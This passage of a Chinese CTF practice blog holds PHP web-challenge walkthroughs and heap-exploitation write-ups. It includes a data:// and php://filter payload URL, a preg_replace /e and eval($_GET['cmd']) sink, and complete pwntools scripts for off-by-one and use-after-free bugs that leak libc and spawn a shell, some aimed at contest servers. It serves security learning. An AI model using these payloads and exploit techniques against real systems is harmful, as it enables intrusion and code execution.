data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.75pvw2b63ec0.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">第一次迭代：</span></span><br><span class="line"><span class="comment">$x = 1 , $y = flag</span></span><br><span class="line"><span class="comment">$$x= $1 , $$y = $flag</span></span><br><span class="line"><span class="comment">$1 = $flag</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第二次迭代：---&gt;满足if条件</span></span><br><span class="line"><span class="comment">$x = flag , $y = 1</span></span><br><span class="line"><span class="comment">$x = $flag , $y = $1</span></span><br><span class="line"><span class="comment">$flag = $1</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//是如何绕过这个函数的呢？</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="comment">//遍历$_GET数组中的键值对，检查如果GET参数flag的值等于某个键名，并且该键名不等于&quot;flag&quot;本身</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">第一次迭代：</span></span><br><span class="line"><span class="comment">$x = 1 , $y = flag</span></span><br><span class="line"><span class="comment">$_GET[&#x27;flag&#x27;] = 1</span></span><br><span class="line"><span class="comment">这里的$x的类型是string，而$_GET[&#x27;flag&#x27;]的值的类型是int，故不完全相等从而绕过,并且flag变量的内容没有被修改过！</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">最后成功</span></span><br><span class="line"><span class="comment">echo &quot;the flag is: &quot;.$flag;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="易错总结："><a href="#易错总结：" class="headerlink" title="易错总结："></a>易错总结：</h3><ol><li><p><code>$x</code>与<code>$_GET[X]</code>要分辨清楚！</p></li><li><p>URL请求中的问号问题：<img lazyload alt="image" data-src="D:\Typora\typora-user-images\image-20230526193753213.png"></p></li></ol><h2 id="0x3-BJDCTF2020-ZJCTF，不过如此"><a href="#0x3-BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="0x3:[BJDCTF2020]ZJCTF，不过如此"></a>0x3:[BJDCTF2020]ZJCTF，不过如此</h2><h3 id="初探题目-1"><a href="#初探题目-1" class="headerlink" title="初探题目"></a>初探题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​    我在思考如何绕过<code>file_get_contents($text,&#39;r&#39;)===&quot;I have a dream&quot;</code>,因为我不知道哪个路径下的文件它的内容是<code>I have a dream</code></p><hr><p>​    今日内容到这里~~</p><p>​    但求坚持！</p><hr><p>​    </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?text=data://text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230527/St2iv8rimage.5lb2d8e0ntw0.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,I have a dream</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;<span class="comment">//目的是为了在会话中保留 $id 值，以备后续的操作使用。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;<span class="comment">//re:regular expression</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">一、&#x27;/&#x27; 是正则表达式的分隔符，&quot;()&quot; 表示捕获分组</span></span><br><span class="line"><span class="comment">二、ei 是修饰符，其中 e 表示替换字符串作为 PHP 代码进行执行，i 表示匹配不区分大小写。</span></span><br><span class="line"><span class="comment">字符串连接运算符&#x27;.&#x27;将字符串 &#x27;(&#x27; $re 和 &#x27;)&#x27; 连接在一起，形成一个完整的正则表达式模式。</span></span><br><span class="line"><span class="comment">如果 $re 的值是 &#x27;abc&#x27;，那么字符串连接运算符将产生 &#x27;(abc)&#x27;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>补充知识：</p><ol><li><p>在正则表达式中，括号具有特殊的含义，并用于多种目的。以下是常见的括号用法：</p><p>​    捕获组 <code>( )</code>：括号可以用于创建捕获组，将匹配的子字符串提取出来以供后续引用或处理。</p><p>​        例如，正则表达式 <code>(abc)+</code> 中的 <code>(abc)</code> 是一个捕获组，表示匹配连续出现的 “abc” 子字符串。</p><p>​    非捕获组 <code>(?: )</code>：括号前加上 <code>?:</code>，可以创建非捕获组，用于匹配但不捕获匹配的内容。</p><p>​        例如，正则表达式 <code>(?:abc)+</code> 中的 <code>(?:abc)</code> 是一个非捕获组，表示匹配连续出现的 “abc” 子字符串，但        不捕获它们。</p><p>​    分组和顺序 <code>( )</code>：括号可以用于分组和确定匹配的顺序。</p><p>​        例如，正则表达式 <code>(abc|def)</code> 表示匹配 “abc” 或 “def”。</p></li><li><p><code>(abc)+</code> 表示匹配连续出现的 “abc” 子字符串，其中括号 <code>(abc)</code> 表示捕获组，<code>+</code> 表示前面的捕获组可以出现一次或多次。</p><p>​    例如，该正则表达式可以匹配 “abc”、”abcabc”、”abcabcabc” 等连续出现多次的 “abc” 子字符串。</p><p>​    <strong>不会匹配单个的 “abc”</strong>，因为 <code>+</code> 要求前面的元素至少出现一次。</p></li><li><p><code>strtolower(&quot;\\1&quot;)</code> 是一个 PHP 的函数调用，用于将字符串转换为小写字母形式。</p><ul><li><code>strtolower()</code> 是一个 PHP 内置函数，用于<strong>将字符串转换为小写字母形式</strong>。</li><li><code>\\1</code> 是一个转义序列，表示要引用正则表达式中第一个捕获组的匹配结果。</li><li>在这个表达式中，<code>strtolower(&quot;\\1&quot;)</code> 的作用是将正则表达式中第一个捕获组的匹配结果转换为小写字母形式。</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUU刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Heap刷题记录</title>
      <link href="/2023/05/02/0_PWN/Heap%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/05/02/0_PWN/Heap%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Heap! Heap! Heap!</p></blockquote><span id="more"></span><h1 id="Off-by-one"><a href="#Off-by-one" class="headerlink" title="Off-by-one"></a>Off-by-one</h1><h2 id="0x0"><a href="#0x0" class="headerlink" title="0x0"></a>0x0</h2><h2 id="0x1-ISCC2023-your-character"><a href="#0x1-ISCC2023-your-character" class="headerlink" title="0x1.ISCC2023_your_character"></a>0x1.ISCC2023_your_character</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"># c = process(&#x27;/home/c2yb8er/下载/ISCC2023/your_character/your_character&#x27;)</span><br><span class="line">c = remote(&quot;59.110.164.72&quot;,10003)</span><br><span class="line">elf = ELF(&#x27;/home/c2yb8er/下载/ISCC2023/your_character/your_character&#x27;)</span><br><span class="line">libc = ELF(&#x27;/home/c2yb8er/下载/ISCC2023/your_character/libc-2.23.so&#x27;)</span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"># 比赛没有做过堆题，一开始以为这道题的考点是UAF(没有仔细看free后将悬挂指针清零了)，没想到是Off-by-one + chunk overlap</span><br><span class="line">def skill_create(size,content):</span><br><span class="line">    c.recvuntil(b&#x27;Your choice :&#x27;)</span><br><span class="line">    c.send(b&#x27;1&#x27;)</span><br><span class="line">    c.recvuntil(b&#x27;Damage of skill : &#x27;)</span><br><span class="line">    c.send(str(size))</span><br><span class="line">    c.recvuntil(b&#x27;introduction of skill:&#x27;)</span><br><span class="line">    c.send(content)</span><br><span class="line"></span><br><span class="line">def skill_delete(index):</span><br><span class="line">    c.recvuntil(b&#x27;Your choice :&#x27;)    </span><br><span class="line">    c.send(b&#x27;5&#x27;)    </span><br><span class="line">    c.recvuntil(b&#x27;Index :&#x27;)    </span><br><span class="line">    c.send(str(index))  </span><br><span class="line"></span><br><span class="line">def  skill_show(index):</span><br><span class="line">    c.recvuntil(b&#x27;Your choice :&#x27;)    </span><br><span class="line">    c.send(b&#x27;4&#x27;)    </span><br><span class="line">    c.recvuntil(b&#x27;Index :&#x27;)    </span><br><span class="line">    c.send(str(index))  </span><br><span class="line"></span><br><span class="line">def  skill_edit(index,content):</span><br><span class="line">    c.recvuntil(b&#x27;Your choice :&#x27;)    </span><br><span class="line">    c.send(b&#x27;3&#x27;)    </span><br><span class="line">    c.recvuntil(b&#x27;Index :&#x27;)    </span><br><span class="line">    c.send(str(index))</span><br><span class="line">    c.recvuntil(b&#x27;introduction of skill : &#x27;)</span><br><span class="line">    c.send(content)</span><br><span class="line"></span><br><span class="line">c.recvuntil(b&#x27;Your choice :&#x27;)</span><br><span class="line">c.send(b&#x27;1&#x27;)  </span><br><span class="line"></span><br><span class="line">skill_create(0x18,b&#x27;aaaa&#x27;)</span><br><span class="line">skill_create(0x10,b&#x27;bbbb&#x27;)</span><br><span class="line"></span><br><span class="line">payload = b&quot;/bin/sh\x00&quot; + b&quot;a&quot; * 0x10 + b&quot;\x41&quot;</span><br><span class="line">skill_edit(0,payload)</span><br><span class="line"></span><br><span class="line">skill_delete(1)</span><br><span class="line"></span><br><span class="line">skill_create(0x30, p64(0) * 3 + p64(0x21) + p64(0x30) + p64(elf.got[&#x27;free&#x27;]))</span><br><span class="line">skill_show(1)</span><br><span class="line"></span><br><span class="line">c.recvuntil(b&#x27;Introduction : &#x27;)</span><br><span class="line">free_addr = c.recv(6).ljust(8,b&#x27;\x00&#x27;)</span><br><span class="line">free_addr = u64(free_addr)</span><br><span class="line">loghex(free_addr,&#x27;THE LEAK ADDR : &#x27;)</span><br><span class="line"></span><br><span class="line">libcbase = free_addr - libc.sym[&#x27;free&#x27;]</span><br><span class="line">system_addr = libcbase + libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh = libcbase + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line"></span><br><span class="line">skill_edit(1,p64(system_addr))</span><br><span class="line">skill_delete(0)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF:"></a>UAF:</h1><h2 id="0x0-hitcon-training-hacknote"><a href="#0x0-hitcon-training-hacknote" class="headerlink" title="0x0:hitcon-training-hacknote"></a>0x0:hitcon-training-hacknote</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">c = process(&#x27;/home/c2yb8er/下载/Heap/UAF/UAF32&#x27;)</span><br><span class="line"># c = remote(&#x27;node4.buuoj.cn&#x27;,29877)</span><br><span class="line">elf = ELF(&#x27;/home/c2yb8er/下载/Heap/UAF/UAF32&#x27;)</span><br><span class="line"># libc = ELF(&#x27;/home/c2yb8er/Binary/libcs/18X64&#x27;)</span><br><span class="line">libc = ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><span class="line"></span><br><span class="line">def addnote(size,content):</span><br><span class="line">    c.recvuntil(b&#x27;Your choice :&#x27;)</span><br><span class="line">    c.sendline(b&#x27;1&#x27;)</span><br><span class="line">    c.recvuntil(b&#x27;Note size :&#x27;)</span><br><span class="line">    c.sendline(str(size))</span><br><span class="line">    c.recvuntil(b&#x27;Content :&#x27;)</span><br><span class="line">    c.sendline(content)</span><br><span class="line"></span><br><span class="line">def delnote(index):</span><br><span class="line">    c.recvuntil(b&#x27;Your choice :&#x27;)</span><br><span class="line">    c.sendline(b&#x27;2&#x27;)</span><br><span class="line">    c.recvuntil(b&#x27;Index :&#x27;)</span><br><span class="line">    c.send(str(index))</span><br><span class="line"></span><br><span class="line">def printnote(index):</span><br><span class="line">    c.recvuntil(b&#x27;Your choice :&#x27;)</span><br><span class="line">    c.sendline(b&#x27;3&#x27;)</span><br><span class="line">    c.recvuntil(b&#x27;Index :&#x27;)</span><br><span class="line">    c.send(str(index))</span><br><span class="line"></span><br><span class="line">context.arch = &#x27;i386&#x27;</span><br><span class="line"># context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">magic = 0x08048986</span><br><span class="line"></span><br><span class="line">addnote(24,b&quot;AAAAAAAA&quot;)</span><br><span class="line">addnote(24,b&quot;aaaaaaaa&quot;)</span><br><span class="line"></span><br><span class="line">gdb.attach(c)</span><br><span class="line">pause()</span><br><span class="line">delnote(0)</span><br><span class="line">delnote(1)</span><br><span class="line"></span><br><span class="line">addnote(8,p32(magic))</span><br><span class="line">printnote(0)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x1-ACTF-2019-babyheap"><a href="#0x1-ACTF-2019-babyheap" class="headerlink" title="0x1:ACTF_2019_babyheap"></a>0x1:ACTF_2019_babyheap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"># c = process(&#x27;/home/c2yb8er/下载/Heap/UAF/ACTF_2019_babyheap&#x27;)</span><br><span class="line">c = remote(&#x27;node4.buuoj.cn&#x27;,29991)</span><br><span class="line">elf = ELF(&#x27;/home/c2yb8er/下载/Heap/UAF/ACTF_2019_babyheap&#x27;)</span><br><span class="line"># libc = ELF(&#x27;/home/c2yb8er/Binary/libcs/18X64&#x27;)</span><br><span class="line">libc = ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><span class="line"></span><br><span class="line">def addnote(size,content):</span><br><span class="line">    c.recvuntil(b&#x27;Your choice: &#x27;)</span><br><span class="line">    c.send(b&#x27;1&#x27;)</span><br><span class="line">    c.recvuntil(b&#x27;Please input size:&#x27;)</span><br><span class="line">    c.send(str(size))</span><br><span class="line">    c.recvuntil(b&#x27;Please input content:&#x27;)</span><br><span class="line">    c.send(content)</span><br><span class="line"></span><br><span class="line">def delnote(index):</span><br><span class="line">    c.recvuntil(b&#x27;Your choice: &#x27;)</span><br><span class="line">    c.send(b&#x27;2&#x27;)</span><br><span class="line">    c.recvuntil(b&#x27;Please input list index:&#x27;)</span><br><span class="line">    c.send(str(index))</span><br><span class="line"></span><br><span class="line">def printnote(index):</span><br><span class="line">    c.recvuntil(b&#x27;Your choice: &#x27;)</span><br><span class="line">    c.send(b&#x27;3&#x27;)</span><br><span class="line">    c.recvuntil(b&#x27;Please input list index:&#x27;)</span><br><span class="line">    c.send(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 0x0000000000602010 : /bin/sh</span><br><span class="line">bin_sh = 0x602010</span><br><span class="line"></span><br><span class="line">addnote(36,b&#x27;AAAAAAAA&#x27;)</span><br><span class="line">addnote(36,b&#x27;aaaaaaaa&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># gdb.attach(c)</span><br><span class="line"># pause()</span><br><span class="line">delnote(0)</span><br><span class="line">delnote(1)</span><br><span class="line"></span><br><span class="line">addnote(0x10,p64(bin_sh)+p64(elf.symbols[&#x27;system&#x27;]))</span><br><span class="line"></span><br><span class="line">printnote(0)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h1><h2 id="0x0-babyheap-0ctf-2017"><a href="#0x0-babyheap-0ctf-2017" class="headerlink" title="0x0:babyheap_0ctf_2017"></a>0x0:babyheap_0ctf_2017</h2><h3 id="0-我决定下工夫来静态分析一波！"><a href="#0-我决定下工夫来静态分析一波！" class="headerlink" title="0.我决定下工夫来静态分析一波！"></a>0.我决定下工夫来静态分析一波！</h3><h4 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h4><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230505/c2yb8erimage.4fl3g6xblbc0.png"></p><h4 id="Init函数"><a href="#Init函数" class="headerlink" title="Init函数"></a>Init函数</h4><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230505/c2yb8erimage.2pb62wxp8g80.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// /dev/urandom 是 Linux 系统中的一种随机数生成设备，可以用来获取安全随机数。在此代码中，通过打开该设备文件，可以获取到对应的文件描述符，从而可以使用系统调用 read() 等函数从该设备文件中读取随机数。</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> || read(fd, buf, <span class="number">0x10</span>uLL) != <span class="number">16</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">  addr = (<span class="type">char</span> *)((buf[<span class="number">0</span>] % <span class="number">0x555555543000</span>uLL + <span class="number">0x10000</span>) &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL);</span><br><span class="line">  v3 = (buf[<span class="number">1</span>] % <span class="number">0xE80</span>uLL) &amp; <span class="number">0xFFFFFFFFFFFFFFF0</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( mmap(addr, <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>) != addr )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">return</span> &amp;addr[v3];</span><br></pre></td></tr></table></figure><p>​    我们逐条剖析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addr = (<span class="type">char</span> *)((buf[<span class="number">0</span>] % <span class="number">0x555555543000</span>uLL + <span class="number">0x10000</span>) &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL);</span><br></pre></td></tr></table></figure><p>​    在这段代码中，<code>addr</code> 是一个 <code>char*</code> 类型的指针变量，用于保存计算得到的内存地址。<br>​    在这个特定的语句中，<code>(buf[0] % 0x555555543000uLL + 0x10000)</code> 这个表达式计算出一个无符号长整型数值，它表示的是一个相对于程序基址的偏移量。程序基址是程序在内存中加载时所在的基地址，通常是一个固定的值，用于计算程序中的全局变量和函数的地址。在这个代码中，通过计算得到的偏移量是以程序基址为基准的。<br>​    接下来的 <code>&amp; 0xFFFFFFFFFFFFF000LL</code> 操作对偏移量进行了一个按位与（AND）操作，并且用了一个掩码值，将偏移量的低 12 位（即 0x1000）清零。这个操作实际上是为了将偏移量<mark>对齐</mark>到一个 4KB 